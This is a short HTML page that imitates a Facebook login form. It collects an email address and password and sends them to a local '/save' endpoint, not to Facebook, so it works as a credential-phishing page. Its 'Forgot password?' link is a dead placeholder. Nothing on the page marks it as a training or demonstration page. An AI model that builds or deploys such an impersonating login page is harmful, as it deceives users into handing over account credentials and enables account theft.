<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook Login Form</title>
  <link rel="stylesheet" href="\style.css">
  <!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

<body>
  <div class="modal">
    <form class="form-content login" action="/save">
      <h1>Facebook Login</h1>
      <input type="email" name="fbEmail" class="login-input" placeholder="Email Address" autofocus>
      <input type="password" name="fbPassword" class="login-input" placeholder="Password">
      <input type="submit" value="Login" class="login-submit">
      <p class="login-help"><a href="#">Forgot password?</a></p>
    </form>
  </div>
</body>
</html>
